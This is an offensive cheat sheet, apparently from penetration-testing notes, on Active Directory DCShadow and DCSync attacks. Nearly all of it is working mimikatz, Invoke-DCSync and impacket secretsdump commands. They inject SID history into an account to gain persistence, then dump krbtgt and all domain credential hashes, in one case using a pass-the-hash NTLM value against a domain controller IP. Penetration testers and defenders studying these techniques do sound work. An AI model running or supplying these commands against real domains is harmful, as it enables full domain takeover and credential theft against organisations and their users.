# AD Attacks

### DC Shadow

DC Shadow attack aims to inject malicious Domain Controlllers into AD infrastructure so that we can dump actual AD members.

```csharp
#Find sid for that user
wmic useraccount where (name='administrator' and domain='%userdomain%') get name,sid

#This will create a RPC Server and listen
lsadump::dcshadow /object:"CN=hax0r,OU=Business,OU=Users,OU=ECORP,DC=ECORP,DC=local" /attribute:sidhistory /value:sid

#Run this from another mimikatz
lsadump::dcshadow /push

#After this unregistration must be done - Relogin
lsadump::dcsync /domain:ECORP.local /account:krbtgt
```

{% embed url="https://attack.stealthbits.com/how-dcshadow-persistence-attack-works" %}

### DC Sync

```csharp
lsadump::dcsync /domain:domain /all /csv
lsadump::dcsync /user:krbtgt

https://gist.github.com/monoxgas/9d238accd969550136db
powershell.exe -c "Import-Module .\Invoke-DCSync.ps1; Invoke-DCSync -PWDumpFormat"

python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.10.10.19
python secretsdump.py -system /tmp/SYSTEM -ntds /tmp/ntds.dit LOCAL
```

